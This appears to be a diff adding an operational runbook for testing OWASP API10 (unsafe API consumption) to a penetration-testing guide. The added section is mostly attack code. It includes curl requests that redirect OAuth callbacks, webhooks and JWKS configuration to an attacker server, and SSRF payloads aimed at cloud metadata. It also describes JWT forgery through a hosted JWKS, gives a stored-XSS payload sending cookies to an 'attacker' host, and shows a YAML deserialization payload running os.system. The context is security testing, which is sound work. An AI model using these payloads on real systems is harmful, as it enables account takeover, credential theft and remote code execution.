@@ -167,6 +167,101 @@ curl -s -X POST -H "$AUTH" -d '{"redirect":"https://attacker-controlled-upstream
 # domain via the proxy.
 ```
 
+## Operational Runbook
+
+API10 demands a different rig — you need to control (or simulate) the upstream the target trusts.
+
+### Step 1 — identify the trust boundary
+
+Map every place the app fetches an external resource:
+
+```bash
+# Look in source for fetch() / requests.get() / httpx.get() patterns
+grep -rE "requests\.(get|post)|httpx\.|fetch\(|axios|http\.Get|HttpClient" /workspace/src/ | grep -v test | head -50
+
+# Look for proxy / SSO callback URL params in network captures
+grep -E "redirect|callback|upstream|oauth|saml|jwks|webhook" /tmp/burp_history.txt | head -20
+```
+
+### Step 2 — host a controlled upstream
+
+```bash
+# Spin up a simple HTTP server that echoes arbitrary content
+python3 -m http.server 8000 &
+
+# Or use mitmproxy / Burp Collaborator for full request/response control
+mitmdump --listen-port 8000 --set http2=true -s manipulate.py
+```
+
+Add a payload that returns malicious upstream-shaped content:
+
+```python
+# manipulate.py — mitmproxy script
+def response(flow):
+    flow.response.text = '{"id": 1, "is_admin": true, "role": "superuser"}'
+```
+
+### Step 3 — point the target at your upstream
+
+```bash
+# OAuth callback / token endpoint pivoting
+curl -s -X POST '<TARGET>/oauth/callback' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"redirect_uri":"https://attacker:8000/cb","state":"x"}'
+
+# Webhook subscription
+curl -s -X POST '<TARGET>/api/webhooks' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"url":"https://attacker:8000/wh","events":["*"]}'
+
+# JWKS / SAML metadata pivot
+curl -s -X PATCH '<TARGET>/api/idp-config' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"jwks_uri":"https://attacker:8000/.well-known/jwks.json"}'
+```
+
+### Step 4 — payloads that compound
+
+Trust-boundary breaches multiply with what the target does to the data:
+
+```python
+# SSRF — point the target's upstream-fetch at internal addresses
+{"upstream_url": "http://127.0.0.1:8080/admin"}
+{"upstream_url": "http://169.254.169.254/latest/meta-data/iam/"}
+
+# Response injection — control what the target sees
+# (host a controlled upstream that returns crafted JSON)
+{"upstream_id": "1", "is_admin": true}
+
+# JWT trust pivot — host a JWKS the target validates against
+# - Forge a token signed with YOUR key
+# - Set jku/jwks_uri to your server
+# - Target fetches your JWKS, validates with your pubkey, accepts forged token
+```
+
+### Step 5 — propagation tests
+
+If the target merges upstream data into its DB / response without sanitization, the upstream payload becomes XSS, SSRF, or deserialization in the **downstream** scope:
+
+```python
+# Host an upstream that returns a stored-XSS payload
+{"name": "<script>fetch('//attacker?c='+document.cookie)</script>"}
+
+# Target ingests this name into its DB, then renders it elsewhere → stored XSS.
+
+# Or: deserialization via upstream YAML/XML
+{"config": "!!python/object/apply:os.system ['curl attacker']"}
+```
+
+### Step 6 — evidence + severity
+
+Severity tiers:
+- **Critical**: upstream-controlled data flows into auth decisions (`is_admin`, role, JWT signing key) or RCE primitives (deserialization sinks)
+- **High**: upstream-controlled data → stored XSS, SSRF, persistent finding
+- **Medium**: upstream-controlled redirect / cookie scope without further chain
+
+Document: the trust-boundary location, the exact payload sent from your upstream, the downstream effect observed (DB write / response / token issued).
+
 ## Verification
 
 Quantify:
